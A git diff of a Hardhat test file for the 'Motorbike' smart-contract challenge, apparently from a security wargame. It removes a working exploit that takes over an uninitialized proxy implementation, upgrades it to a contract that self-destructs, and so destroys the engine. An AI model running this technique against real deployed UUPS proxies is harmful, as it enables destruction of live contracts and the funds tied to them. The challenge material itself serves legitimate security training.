@@ -27,34 +27,6 @@ describe('[Challenge] Motorbike', function () {
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        const EngineContractFactory = await ethers.getContractFactory('Engine');
-        let engineSlot = await ethers.provider.getStorageAt(
-            this.target.address, 
-            "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
-        );
-        let engineAddress = ethers.utils.hexDataSlice(engineSlot, 12);
-        this.engine = EngineContractFactory.attach(engineAddress);
-
-        console.log(`\t Info...`);
-        console.log(`\t target: ${this.target.address}`);
-        console.log(`\t engine: ${this.engine.address}`);
-        console.log(`\t engine upgrader: ${await this.engine.upgrader()}`);  
-
-        console.log(`\t Initializing the engine...`);
-        let initTX = await this.engine.connect(attacker).initialize({gasLimit:200000}); await initTX.wait(); 
-
-        console.log(`\t Deploying destroyer...`);
-        const EngineDestroyerFactory = await ethers.getContractFactory('EngineDestroyer', attacker);
-        const EngineDestroyer = await EngineDestroyerFactory.deploy();
-
-        console.log(`\t Destroying the engine...`);
-        let ABI = ["function destroy()"];
-        let iface = new ethers.utils.Interface(ABI);
-        let data = iface.encodeFunctionData("destroy");
-        let exploitTX = await this.engine.connect(attacker).upgradeToAndCall(
-            EngineDestroyer.address, 
-            data,{gasLimit:200000}
-        ); await exploitTX.wait();
         
     }).timeout(0);
 
